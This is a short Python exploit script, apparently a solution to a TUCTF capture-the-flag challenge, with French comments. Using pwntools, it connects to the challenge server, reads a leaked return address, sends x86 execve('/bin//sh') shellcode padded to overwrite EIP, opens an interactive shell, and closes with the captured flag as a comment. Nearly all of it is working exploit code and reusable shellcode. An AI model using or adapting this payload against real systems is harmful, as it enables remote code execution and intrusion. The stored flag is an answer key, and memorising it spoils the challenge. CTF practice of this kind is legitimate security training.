from pwn import *

IP = "chal.tuctf.com"
PORT = 30506

p = remote(IP, PORT)

ret = ""
pad = 40 #Padding pour réecrire le EIP
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" \
            "\x68\x68\x2f\x62\x69\x6e\x31" \
            "\xc9\x31\xd2\x89\xe3\xb0\x0b" \
            "\xcd\x80"

#Récupère l'adresse EIP
leak_ret = p.readuntil(">").split("\n")[1]
leak_ret = int(leak_ret, 16)

# Shellcode + Padding + RET_EIP
payload = shellcode+"A"*(pad-len(shellcode))+p32(leak_ret)

p.send(payload)
p.interactive()

#TUCTF{4www..._b4by5_f1r57_3xpl017._h0w_cu73}
